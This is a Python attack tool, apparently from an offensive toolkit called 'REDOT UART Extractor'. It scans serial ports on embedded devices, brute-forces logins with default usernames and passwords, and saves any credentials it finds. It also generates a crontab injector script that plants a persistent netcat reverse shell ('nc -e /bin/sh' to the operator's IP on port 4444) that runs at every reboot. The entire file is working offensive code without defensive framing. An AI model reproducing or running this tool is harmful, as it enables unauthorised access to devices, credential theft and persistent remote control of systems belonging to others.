#!/usr/bin/env python3
import socket
import os
import serial
import serial.tools.list_ports
import json

# Directories
LOG_DIR = "logs/uart"
AGENT_FILE = "webgui/agents.json"
INJECTOR_SCRIPT = "modules/post/crontab_injector.sh"
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(os.path.dirname(AGENT_FILE), exist_ok=True)
os.makedirs(os.path.dirname(INJECTOR_SCRIPT), exist_ok=True)

# Common parameters
BAUD_RATES = [9600, 19200, 38400, 57600, 115200]
COMMON_USERS = ["admin", "root", "user"]
COMMON_PASSWORDS = ["admin", "root", "1234", "toor", "password"]

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def create_cron_injector_script():
    if not os.path.exists(INJECTOR_SCRIPT):
        with open(INJECTOR_SCRIPT, "w") as f:
            f.write(f"#!/bin/bash\n")
            f.write(f'echo "@reboot /bin/bash -c \'nc -e /bin/sh {get_local_ip()} 4444\'" >> /etc/crontab\n')
        os.chmod(INJECTOR_SCRIPT, 0o755)

def fingerprint_banner(text):
    lower = text.lower()
    if "login" in lower and "password" in lower:
        return "Telnet"
    if "boot" in lower:
        return "Bootloader"
    if "#" in text or "busybox" in lower:
        return "Shell"
    return "Unknown"

def try_brute_force(ser):
    for u in COMMON_USERS:
        for p in COMMON_PASSWORDS:
            ser.write(f"{u}\n".encode())
            ser.write(f"{p}\n".encode())
            out = ser.read(200).decode(errors='ignore')
            if "incorrect" not in out.lower():
                return u, p, out
    return None, None, None

def scan_ports():
    ports = serial.tools.list_ports.comports()
    agents = []
    for port in ports:
        for baud in BAUD_RATES:
            try:
                with serial.Serial(port.device, baudrate=baud, timeout=2) as ser:
                    ser.write(b'\n')
                    output = ser.read(200).decode(errors='ignore')
                    if output.strip():
                        proto = fingerprint_banner(output)
                        print(f"[+] {port.device} @ {baud} Baud - {proto}")
                        fname = f"{port.device.replace('/', '_')}_{baud}.log"
                        with open(f"{LOG_DIR}/{fname}", "w") as f:
                            f.write(output)
                        agent = {
                            "name": f"UART-{port.device}",
                            "ip": "N/A",
                            "protocol": proto,
                            "port": port.device,
                            "baud": baud,
                            "banner": output.strip().split("\n")[0]
                        }
                        agents.append(agent)
                        user, pwd, _ = try_brute_force(ser)
                        if user:
                            with open(f"{LOG_DIR}/creds_found.txt", "a") as f:
                                f.write(f"{port.device}@{baud} = {user}:{pwd}\n")
            except Exception as e:
                print(f"[-] Error: {e}")
    return agents

def update_agents_json(new_agents):
    existing = []
    if os.path.exists(AGENT_FILE):
        with open(AGENT_FILE) as f:
            try:
                existing = json.load(f)
            except:
                existing = []
    seen = {(a['name'], a['port']) for a in existing}
    for agent in new_agents:
        if (agent['name'], agent['port']) not in seen:
            existing.append(agent)
    with open(AGENT_FILE, "w") as f:
        json.dump(existing, f, indent=2)

if __name__ == "__main__":
    print("=== REDOT UART Extractor ===")
    create_cron_injector_script()
    discovered_agents = scan_ports()
    update_agents_json(discovered_agents)
    print("[✓] Logs saved. Agents updated. Injector ready.")
